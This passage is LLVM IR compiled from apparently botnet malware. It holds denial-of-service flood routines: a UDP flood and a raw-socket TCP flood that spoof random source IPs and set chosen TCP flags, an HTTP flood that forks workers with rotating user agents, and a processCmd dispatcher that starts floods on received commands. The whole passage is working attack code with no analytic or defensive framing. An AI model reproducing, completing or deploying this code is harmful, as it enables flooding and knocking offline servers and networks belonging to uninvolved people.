  %43 = add nsw i64 %42, 28
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %49 = load i32, i32* %48, align 4
  %50 = call i32 @getRandomIP(i32 %41)
  %51 = call i32 @htonl(i32 %50) #15
  %52 = add nsw i64 %42, 8
  %53 = trunc i64 %52 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %49, i32 %51, i8 zeroext 17, i32 %53)
  %54 = trunc i64 %52 to i16
  %55 = call zeroext i16 @htons(i16 zeroext %54) #15
  %56 = getelementptr inbounds i8, i8* %45, i64 24
  %57 = bitcast i8* %56 to i16*
  store i16 %55, i16* %57, align 8
  %58 = call i32 @rand_cmwc()
  %59 = trunc i32 %58 to i16
  %60 = bitcast i8* %47 to i16*
  store i16 %59, i16* %60, align 4
  br i1 %10, label %61, label %63

; <label>:61:                                     ; preds = %39
  %62 = call i32 @rand_cmwc()
  br label %67

; <label>:63:                                     ; preds = %39
  %64 = trunc i32 %1 to i16
  %65 = call zeroext i16 @htons(i16 zeroext %64) #15
  %66 = zext i16 %65 to i32
  br label %67

; <label>:67:                                     ; preds = %63, %61
  %.pre-phi = phi i16 [ %64, %63 ], [ 0, %61 ]
  %68 = phi i32 [ %66, %63 ], [ %62, %61 ]
  %69 = trunc i32 %68 to i16
  %70 = getelementptr inbounds i8, i8* %45, i64 22
  %71 = bitcast i8* %70 to i16*
  store i16 %69, i16* %71, align 2
  %72 = getelementptr inbounds i8, i8* %45, i64 26
  %73 = bitcast i8* %72 to i16*
  store i16 0, i16* %73, align 2
  %74 = getelementptr inbounds i8, i8* %45, i64 28
  call void @makeRandomStr(i8* %74, i32 %3)
  %75 = bitcast i8* %45 to i16*
  %76 = getelementptr inbounds i8, i8* %45, i64 2
  %77 = bitcast i8* %76 to i16*
  %78 = load i16, i16* %77, align 2
  %79 = zext i16 %78 to i32
  %80 = call zeroext i16 @csum(i16* nonnull %75, i32 %79)
  %81 = getelementptr inbounds i8, i8* %45, i64 10
  %82 = bitcast i8* %81 to i16*
  store i16 %80, i16* %82, align 2
  %83 = call i64 @time(i64* null) #7
  %84 = zext i32 %2 to i64
  %85 = add i64 %83, %84
  %86 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %87 = getelementptr inbounds i8, i8* %45, i64 4
  %88 = bitcast i8* %87 to i16*
  %89 = getelementptr inbounds i8, i8* %45, i64 12
  %90 = bitcast i8* %89 to i32*
  %sext = shl i64 %85, 32
  %91 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %67
  %.0 = phi i32 [ 0, %67 ], [ %.0.be, %.backedge.backedge ]
  %92 = call i64 @sendto(i32 %25, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %86, i32 16) #7
  %93 = call i32 @rand_cmwc()
  %94 = trunc i32 %93 to i16
  store i16 %94, i16* %60, align 4
  br i1 %10, label %95, label %97

; <label>:95:                                     ; preds = %.backedge
  %96 = call i32 @rand_cmwc()
  br label %100

; <label>:97:                                     ; preds = %.backedge
  %98 = call zeroext i16 @htons(i16 zeroext %.pre-phi) #15
  %99 = zext i16 %98 to i32
  br label %100

; <label>:100:                                    ; preds = %97, %95
  %101 = phi i32 [ %96, %95 ], [ %99, %97 ]
  %102 = trunc i32 %101 to i16
  store i16 %102, i16* %71, align 2
  %103 = call i32 @rand_cmwc()
  %104 = trunc i32 %103 to i16
  store i16 %104, i16* %88, align 4
  %105 = call i32 @getRandomIP(i32 %41)
  %106 = call i32 @htonl(i32 %105) #15
  store i32 %106, i32* %90, align 4
  %107 = load i16, i16* %77, align 2
  %108 = zext i16 %107 to i32
  %109 = call zeroext i16 @csum(i16* nonnull %75, i32 %108)
  store i16 %109, i16* %82, align 2
  %110 = icmp eq i32 %.0, %4
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %100
  %112 = call i64 @time(i64* null) #7
  %113 = icmp sgt i64 %112, %91
  br i1 %113, label %116, label %.backedge.backedge

; <label>:114:                                    ; preds = %100
  %115 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %114, %111
  %.0.be = phi i32 [ %115, %114 ], [ 0, %111 ]
  br label %.backedge

; <label>:116:                                    ; preds = %111
  call void @llvm.stackrestore(i8* %44)
  br label %117

; <label>:117:                                    ; preds = %22, %17, %27, %116
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #7

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #15
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %145

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %145, label %28

; <label>:28:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %29 = bitcast i32* %9 to i8*
  %30 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %29, i32 4) #7
  %31 = icmp slt i32 %30, 0
  br i1 %31, label %145, label %32

; <label>:32:                                     ; preds = %28
  %33 = icmp eq i32 %6, 0
  %34 = sub nsw i32 32, %6
  %35 = shl i32 -1, %34
  %.074 = select i1 %33, i32 0, i32 %35
  %36 = sext i32 %4 to i64
  %37 = add nsw i64 %36, 40
  %38 = call i8* @llvm.stacksave()
  %39 = alloca i8, i64 %37, align 16
  %40 = bitcast i8* %39 to %struct.iphdr*
  %41 = getelementptr i8, i8* %39, i64 20
  %42 = bitcast i8* %41 to %struct.tcphdr*
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %44 = load i32, i32* %43, align 4
  %45 = call i32 @getRandomIP(i32 %.074)
  %46 = call i32 @htonl(i32 %45) #15
  %47 = add i32 %4, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %40, i32 %44, i32 %46, i8 zeroext 6, i32 %47)
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  %50 = bitcast i8* %41 to i16*
  store i16 %49, i16* %50, align 4
  %51 = call i32 @rand_cmwc()
  %52 = getelementptr inbounds i8, i8* %39, i64 24
  %53 = bitcast i8* %52 to i32*
  store i32 %51, i32* %53, align 8
  %54 = getelementptr inbounds i8, i8* %39, i64 28
  %55 = bitcast i8* %54 to i32*
  store i32 0, i32* %55, align 4
  %56 = getelementptr inbounds i8, i8* %39, i64 32
  %57 = bitcast i8* %56 to i16*
  %58 = load i16, i16* %57, align 16
  %59 = and i16 %58, -241
  %60 = or i16 %59, 80
  store i16 %60, i16* %57, align 16
  %61 = call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.102, i64 0, i64 0)) #14
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %63, label %66

; <label>:63:                                     ; preds = %32
  %64 = and i16 %58, -8177
  %65 = or i16 %64, 8016
  store i16 %65, i16* %57, align 16
  br label %.loopexit

; <label>:66:                                     ; preds = %32
  %67 = call i8* @strtok(i8* %3, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i64 0, i64 0)) #7
  %68 = icmp eq i8* %67, null
  br i1 %68, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %66
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %86
  %.07576 = phi i8* [ %87, %86 ], [ %67, %.lr.ph.preheader ]
  %69 = call i32 @strcmp(i8* nonnull %.07576, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.104, i64 0, i64 0)) #14
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %.sink.split, label %71

; <label>:71:                                     ; preds = %.lr.ph
  %72 = call i32 @strcmp(i8* nonnull %.07576, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i64 0, i64 0)) #14
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %.sink.split, label %74

; <label>:74:                                     ; preds = %71
  %75 = call i32 @strcmp(i8* nonnull %.07576, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i64 0, i64 0)) #14
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %.sink.split, label %77

; <label>:77:                                     ; preds = %74
  %78 = call i32 @strcmp(i8* nonnull %.07576, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i64 0, i64 0)) #14
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %.sink.split, label %80

; <label>:80:                                     ; preds = %77
  %81 = call i32 @strcmp(i8* nonnull %.07576, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i64 0, i64 0)) #14
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %.sink.split, label %86

.sink.split:                                      ; preds = %80, %77, %74, %71, %.lr.ph
  %.sink7 = phi i16 [ -513, %.lr.ph ], [ -1025, %71 ], [ -257, %74 ], [ -4097, %77 ], [ -2049, %80 ]
  %.sink5 = phi i16 [ 512, %.lr.ph ], [ 1024, %71 ], [ 256, %74 ], [ 4096, %77 ], [ 2048, %80 ]
  %83 = load i16, i16* %57, align 16
  %84 = and i16 %83, %.sink7
  %85 = or i16 %84, %.sink5
  store i16 %85, i16* %57, align 16
  br label %86

; <label>:86:                                     ; preds = %80, %.sink.split
  %87 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i64 0, i64 0)) #7
  %88 = icmp eq i8* %87, null
  br i1 %88, label %.loopexit.loopexit, label %.lr.ph

.loopexit.loopexit:                               ; preds = %86
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %66, %63
  %89 = call i32 @rand_cmwc()
  %90 = trunc i32 %89 to i16
  %91 = getelementptr inbounds i8, i8* %39, i64 34
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 2
  %93 = getelementptr inbounds i8, i8* %39, i64 36
  %94 = bitcast i8* %93 to i16*
  store i16 0, i16* %94, align 4
  %95 = getelementptr inbounds i8, i8* %39, i64 38
  %96 = bitcast i8* %95 to i16*
  store i16 0, i16* %96, align 2
  br i1 %11, label %97, label %99

; <label>:97:                                     ; preds = %.loopexit
  %98 = call i32 @rand_cmwc()
  br label %103

; <label>:99:                                     ; preds = %.loopexit
  %100 = trunc i32 %1 to i16
  %101 = call zeroext i16 @htons(i16 zeroext %100) #15
  %102 = zext i16 %101 to i32
  br label %103

; <label>:103:                                    ; preds = %99, %97
  %104 = phi i32 [ %98, %97 ], [ %102, %99 ]
  %105 = trunc i32 %104 to i16
  %106 = getelementptr inbounds i8, i8* %39, i64 22
  %107 = bitcast i8* %106 to i16*
  store i16 %105, i16* %107, align 2
  %108 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %108, i16* %94, align 4
  %109 = bitcast i8* %39 to i16*
  %110 = getelementptr inbounds i8, i8* %39, i64 2
  %111 = bitcast i8* %110 to i16*
  %112 = load i16, i16* %111, align 2
  %113 = zext i16 %112 to i32
  %114 = call zeroext i16 @csum(i16* nonnull %109, i32 %113)
  %115 = getelementptr inbounds i8, i8* %39, i64 10
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %117 = call i64 @time(i64* null) #7
  %118 = zext i32 %2 to i64
  %119 = add i64 %117, %118
  %120 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %121 = getelementptr inbounds i8, i8* %39, i64 12
  %122 = bitcast i8* %121 to i32*
  %123 = getelementptr inbounds i8, i8* %39, i64 4
  %124 = bitcast i8* %123 to i16*
  %sext = shl i64 %119, 32
  %125 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %103
  %.0 = phi i32 [ 0, %103 ], [ %.0.be, %.backedge.backedge ]
  %126 = call i64 @sendto(i32 %26, i8* nonnull %39, i64 %37, i32 0, %struct.sockaddr* nonnull %120, i32 16) #7
  %127 = call i32 @getRandomIP(i32 %.074)
  %128 = call i32 @htonl(i32 %127) #15
  store i32 %128, i32* %122, align 4
  %129 = call i32 @rand_cmwc()
  %130 = trunc i32 %129 to i16
  store i16 %130, i16* %124, align 4
  %131 = call i32 @rand_cmwc()
  store i32 %131, i32* %53, align 8
  %132 = call i32 @rand_cmwc()
  %133 = trunc i32 %132 to i16
  store i16 %133, i16* %50, align 4
  store i16 0, i16* %94, align 4
  %134 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %134, i16* %94, align 4
  %135 = load i16, i16* %111, align 2
  %136 = zext i16 %135 to i32
  %137 = call zeroext i16 @csum(i16* nonnull %109, i32 %136)
  store i16 %137, i16* %116, align 2
  %138 = icmp eq i32 %.0, %5
  br i1 %138, label %139, label %142

; <label>:139:                                    ; preds = %.backedge
  %140 = call i64 @time(i64* null) #7
  %141 = icmp sgt i64 %140, %125
  br i1 %141, label %144, label %.backedge.backedge

; <label>:142:                                    ; preds = %.backedge
  %143 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %142, %139
  %.0.be = phi i32 [ %143, %142 ], [ 0, %139 ]
  br label %.backedge

; <label>:144:                                    ; preds = %139
  call void @llvm.stackrestore(i8* %38)
  br label %145

; <label>:145:                                    ; preds = %23, %18, %28, %144
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #7
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #7
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #15
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #7
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #7
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #7
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = tail call i64 @time(i64* null) #7
  %10 = zext i32 %4 to i64
  %11 = add i64 %9, %10
  %12 = icmp sgt i32 %5, 0
  br i1 %12, label %.lr.ph15, label %._crit_edge16

.lr.ph15:                                         ; preds = %6
  %13 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %16

; <label>:14:                                     ; preds = %16
  %15 = icmp slt i32 %25, %5
  br i1 %15, label %16, label %._crit_edge16.loopexit

; <label>:16:                                     ; preds = %.lr.ph15, %14
  %.013 = phi i32 [ 0, %.lr.ph15 ], [ %25, %14 ]
  %17 = tail call i32 @rand() #7
  %18 = srem i32 %17, 59
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %19
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %13, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.110, i64 0, i64 0), i8* %0, i8* %3, i8* %1, i8* %21) #7
  %23 = tail call i32 @fork() #7
  %24 = icmp eq i32 %23, 0
  %25 = add nuw nsw i32 %.013, 1
  br i1 %24, label %14, label %.preheader

.preheader:                                       ; preds = %16
  %sext = shl i64 %11, 32
  %26 = ashr exact i64 %sext, 32
  %27 = tail call i64 @time(i64* null) #7
  %28 = icmp sgt i64 %26, %27
  br i1 %28, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %29 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %30

; <label>:30:                                     ; preds = %.lr.ph, %.backedge
  %31 = tail call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %.backedge, label %33

; <label>:33:                                     ; preds = %30
  %34 = call i64 @strlen(i8* nonnull %13) #14
  %35 = call i64 @write(i32 %31, i8* nonnull %13, i64 %34) #7
  %36 = call i64 @read(i32 %31, i8* nonnull %29, i64 1) #7
  %37 = tail call i32 @close(i32 %31) #7
  br label %.backedge

.backedge:                                        ; preds = %33, %30
  %38 = tail call i64 @time(i64* null) #7
  %39 = icmp sgt i64 %26, %38
  br i1 %39, label %30, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  tail call void @exit(i32 0) #16
  unreachable

._crit_edge16.loopexit:                           ; preds = %14
  br label %._crit_edge16

._crit_edge16:                                    ; preds = %._crit_edge16.loopexit, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #5

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i64 0, i64 0)) #14
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %231, label %6

; <label>:6:                                      ; preds = %2
  %7 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.112, i64 0, i64 0)) #14
  %8 = icmp eq i32 %7, 0
  br i1 %8, label %9, label %39

; <label>:9:                                      ; preds = %6
  %10 = icmp slt i32 %0, 6
  br i1 %10, label %231, label %11

; <label>:11:                                     ; preds = %9
  %12 = getelementptr inbounds i8*, i8** %1, i64 3
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 @atoi(i8* %13) #14
  %15 = icmp slt i32 %14, 1
  br i1 %15, label %231, label %16

; <label>:16:                                     ; preds = %11
  %17 = getelementptr inbounds i8*, i8** %1, i64 5
  %18 = load i8*, i8** %17, align 8
  %19 = tail call i32 @atoi(i8* %18) #14
  %20 = icmp slt i32 %19, 1
  br i1 %20, label %231, label %21

; <label>:21:                                     ; preds = %16
  %22 = tail call i32 @listFork()
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %24, label %231

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8*, i8** %1, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = getelementptr inbounds i8*, i8** %1, i64 2
  %28 = load i8*, i8** %27, align 8
  %29 = load i8*, i8** %12, align 8
  %30 = tail call i32 @atoi(i8* %29) #14
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds i8*, i8** %1, i64 4
  %33 = load i8*, i8** %32, align 8
  %34 = load i8*, i8** %17, align 8
  %35 = tail call i32 @atoi(i8* %34) #14
  %36 = getelementptr inbounds i8*, i8** %1, i64 6
  %37 = load i8*, i8** %36, align 8
  %38 = tail call i32 @atoi(i8* %37) #14
  tail call void @SendHTTP(i8* %26, i8* %28, i16 zeroext %31, i8* %33, i32 %35, i32 %38)
  tail call void @exit(i32 0) #16
  unreachable

; <label>:39:                                     ; preds = %6
  %40 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.113, i64 0, i64 0)) #14
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %.loopexit131

; <label>:42:                                     ; preds = %39
  %43 = icmp slt i32 %0, 6
  br i1 %43, label %231, label %44

; <label>:44:                                     ; preds = %42
  %45 = getelementptr inbounds i8*, i8** %1, i64 3
  %46 = load i8*, i8** %45, align 8
  %47 = tail call i32 @atoi(i8* %46) #14
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %231, label %49

; <label>:49:                                     ; preds = %44
  %50 = getelementptr inbounds i8*, i8** %1, i64 2
  %51 = load i8*, i8** %50, align 8
  %52 = tail call i32 @atoi(i8* %51) #14
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %231, label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds i8*, i8** %1, i64 4
  %56 = load i8*, i8** %55, align 8
  %57 = tail call i32 @atoi(i8* %56) #14
  %58 = icmp eq i32 %57, -1
  %59 = icmp sgt i32 %57, 1024
  %or.cond = or i1 %58, %59
  br i1 %or.cond, label %231, label %60

; <label>:60:                                     ; preds = %54
  %61 = icmp eq i32 %0, 6
  br i1 %61, label %62, label %67

; <label>:62:                                     ; preds = %60
  %63 = getelementptr inbounds i8*, i8** %1, i64 5
  %64 = load i8*, i8** %63, align 8
  %65 = tail call i32 @atoi(i8* %64) #14
  %66 = icmp slt i32 %65, 1
  br i1 %66, label %231, label %67

; <label>:67:                                     ; preds = %62, %60
  %68 = getelementptr inbounds i8*, i8** %1, i64 1
  %69 = load i8*, i8** %68, align 8
  %70 = tail call i32 @atoi(i8* %51) #14
  %71 = tail call i32 @atoi(i8* %46) #14
  %72 = tail call i32 @atoi(i8* %56) #14
  br i1 %61, label %73, label %77

; <label>:73:                                     ; preds = %67
  %74 = getelementptr inbounds i8*, i8** %1, i64 5
  %75 = load i8*, i8** %74, align 8
  %76 = tail call i32 @atoi(i8* %75) #14
  br label %77

; <label>:77:                                     ; preds = %67, %73
  %78 = phi i32 [ %76, %73 ], [ 10, %67 ]
  %strchr = tail call i8* @strchr(i8* %69, i32 44)
  %79 = icmp eq i8* %strchr, null
  br i1 %79, label %86, label %.preheader130.preheader

.preheader130.preheader:                          ; preds = %77
  br label %.preheader130

.preheader130:                                    ; preds = %.preheader130.preheader, %82
  %.sink = phi i8* [ null, %82 ], [ %69, %.preheader130.preheader ]
  %80 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i64 0, i64 0)) #7
  %81 = icmp eq i8* %80, null
  br i1 %81, label %.loopexit131.loopexit, label %82

; <label>:82:                                     ; preds = %.preheader130
  %83 = tail call i32 @listFork()
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %.preheader130

; <label>:85:                                     ; preds = %82
  tail call void @SendUDP(i8* nonnull %80, i32 %70, i32 %71, i32 %72, i32 %78, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:86:                                     ; preds = %77
  %87 = tail call i32 @listFork()
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %231

; <label>:89:                                     ; preds = %86
  tail call void @SendUDP(i8* %69, i32 %70, i32 %71, i32 %72, i32 %78, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit131.loopexit:                            ; preds = %.preheader130
  %.pre = load i8*, i8** %1, align 8
  br label %.loopexit131

.loopexit131:                                     ; preds = %.loopexit131.loopexit, %39
  %90 = phi i8* [ %.pre, %.loopexit131.loopexit ], [ %3, %39 ]
  %91 = tail call i32 @strcmp(i8* %90, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.114, i64 0, i64 0)) #14
  %92 = icmp eq i32 %91, 0
  br i1 %92, label %93, label %.loopexit129

; <label>:93:                                     ; preds = %.loopexit131
  %94 = icmp slt i32 %0, 6
  br i1 %94, label %231, label %95

; <label>:95:                                     ; preds = %93
  %96 = getelementptr inbounds i8*, i8** %1, i64 3
  %97 = load i8*, i8** %96, align 8
  %98 = tail call i32 @atoi(i8* %97) #14
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %231, label %100

; <label>:100:                                    ; preds = %95
  %101 = getelementptr inbounds i8*, i8** %1, i64 2
  %102 = load i8*, i8** %101, align 8
  %103 = tail call i32 @atoi(i8* %102) #14
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %231, label %105

; <label>:105:                                    ; preds = %100
  %106 = getelementptr inbounds i8*, i8** %1, i64 5
  %107 = load i8*, i8** %106, align 8
  %108 = tail call i32 @atoi(i8* %107) #14
  %109 = icmp slt i32 %108, 0
  br i1 %109, label %231, label %110

; <label>:110:                                    ; preds = %105
  %111 = icmp eq i32 %0, 7
  br i1 %111, label %112, label %117

; <label>:112:                                    ; preds = %110
  %113 = getelementptr inbounds i8*, i8** %1, i64 6
  %114 = load i8*, i8** %113, align 8
  %115 = tail call i32 @atoi(i8* %114) #14
  %116 = icmp slt i32 %115, 1
  br i1 %116, label %231, label %117

; <label>:117:                                    ; preds = %112, %110
  %118 = getelementptr inbounds i8*, i8** %1, i64 1
  %119 = load i8*, i8** %118, align 8
  %120 = tail call i32 @atoi(i8* %102) #14
  %121 = tail call i32 @atoi(i8* %97) #14
  %122 = getelementptr inbounds i8*, i8** %1, i64 4
  %123 = load i8*, i8** %122, align 8
  br i1 %111, label %124, label %128

; <label>:124:                                    ; preds = %117
  %125 = getelementptr inbounds i8*, i8** %1, i64 6
  %126 = load i8*, i8** %125, align 8
  %127 = tail call i32 @atoi(i8* %126) #14
  br label %128

; <label>:128:                                    ; preds = %117, %124
  %129 = phi i32 [ %127, %124 ], [ 10, %117 ]
  %130 = tail call i32 @atoi(i8* %107) #14
  %strchr118 = tail call i8* @strchr(i8* %119, i32 44)
  %131 = icmp eq i8* %strchr118, null
  br i1 %131, label %138, label %.preheader128.preheader

.preheader128.preheader:                          ; preds = %128
  br label %.preheader128

.preheader128:                                    ; preds = %.preheader128.preheader, %134
  %.sink121 = phi i8* [ null, %134 ], [ %119, %.preheader128.preheader ]
  %132 = tail call i8* @strtok(i8* %.sink121, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i64 0, i64 0)) #7
  %133 = icmp eq i8* %132, null
  br i1 %133, label %.loopexit129.loopexit, label %134

; <label>:134:                                    ; preds = %.preheader128
  %135 = tail call i32 @listFork()
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %137, label %.preheader128

; <label>:137:                                    ; preds = %134
  tail call void @SendTCP(i8* nonnull %132, i32 %120, i32 %121, i8* %123, i32 %130, i32 %129, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:138:                                    ; preds = %128
  %139 = tail call i32 @listFork()
  %140 = icmp eq i32 %139, 0
  br i1 %140, label %141, label %231

; <label>:141:                                    ; preds = %138
  tail call void @SendTCP(i8* %119, i32 %120, i32 %121, i8* %123, i32 %130, i32 %129, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit129.loopexit:                            ; preds = %.preheader128
  %.pre144 = load i8*, i8** %1, align 8
  br label %.loopexit129

